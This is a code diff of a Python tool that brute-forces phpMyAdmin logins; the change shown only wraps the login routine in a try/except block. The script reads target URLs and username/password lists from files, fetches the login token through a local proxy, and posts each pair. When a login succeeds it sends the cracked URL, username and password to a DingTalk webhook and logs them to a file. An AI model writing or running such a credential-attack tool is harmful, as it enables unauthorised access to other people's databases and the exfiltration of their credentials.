@@ -33,36 +33,39 @@ class FuckPhpmyadmin:
                     break
 
     def Brute_kernel(self,url,username,password):
-        http=requests.Session()
-        headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
-        }
-        xpose=http.get(url,proxies={"http":"http://127.0.0.1:8118"}).text
-        html=etree.HTML(xpose,etree.HTMLParser())
-        token=html.xpath("//html//input[@name='token']//@value")[0]
-        data={
-                "pma_username": username,
-                "pma_password": password,
-                "server": "1",
-                "target": "index.php",
-                "token": token
-        }
-        res=http.post(url,data=data,headers=headers,proxies={"http":"http://127.0.0.1:8118"}).text
-        if "information_schema" in res:
-            write_line="url:"+url+" | user:"+username+" | pass:"+password+" SUCCESS"
-            data={
-                "msgtype":"text",
-                "text":{"content":"喵喵喵,%s"%write_line}
+        try:
+            http=requests.Session()
+            headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
             }
-            data=json.dumps(data)
-            requests.post("https://oapi.dingtalk.com/robot/send?access_token=",data=data,headers={'Content-Type': 'application/json'})
-            print(write_line)
-            with open("success.txt","a") as f:
-                f.write(write_line+"\n")
-            return 0
-        else:
-            print("fail",url,username,password)
-            return 1
+            xpose=http.get(url,proxies={"http":"http://127.0.0.1:8118"}).text
+            html=etree.HTML(xpose,etree.HTMLParser())
+            token=html.xpath("//html//input[@name='token']//@value")[0]
+            data={
+                    "pma_username": username,
+                    "pma_password": password,
+                    "server": "1",
+                    "target": "index.php",
+                    "token": token
+            }
+            res=http.post(url,data=data,headers=headers,proxies={"http":"http://127.0.0.1:8118"}).text
+            if "information_schema" in res:
+                write_line="url:"+url+" | user:"+username+" | pass:"+password+" SUCCESS"
+                data={
+                    "msgtype":"text",
+                    "text":{"content":"喵喵喵,%s"%write_line}
+                }
+                data=json.dumps(data)
+                requests.post("https://oapi.dingtalk.com/robot/send?access_token=",data=data,headers={'Content-Type': 'application/json'})
+                print(write_line)
+                with open("success.txt","a") as f:
+                    f.write(write_line+"\n")
+                return 0
+            else:
+                print("fail",url,username,password)
+                return 1
+        except:
+            print("NOT EXIT")
 instance=FuckPhpmyadmin()
 instance.Load_Url("url.txt","user.txt","pass.txt")
 instance.Start(10)
